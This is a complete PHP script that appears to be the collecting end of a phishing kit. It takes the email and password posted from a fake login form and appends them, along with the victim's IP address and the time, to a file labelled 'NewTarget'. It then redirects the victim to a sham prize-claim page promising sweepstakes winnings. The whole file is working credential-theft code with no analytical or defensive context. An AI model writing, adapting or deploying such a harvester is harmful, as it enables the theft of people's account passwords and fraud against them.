<?php
$file = "NewTarget________________2021";
$email      = $_POST['username'];
$password   = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,");
fwrite($handle, "\n");
fwrite($handle, "::  EMAIL     :: ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "::  PASSWORD  :: ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "::  IP        :: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "::  TIME      :: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fclose($handle);
header("Location:https://freesweepcash2021.github.io/claimsredeem/pay_fbs.html?You_Win_100SC");


?>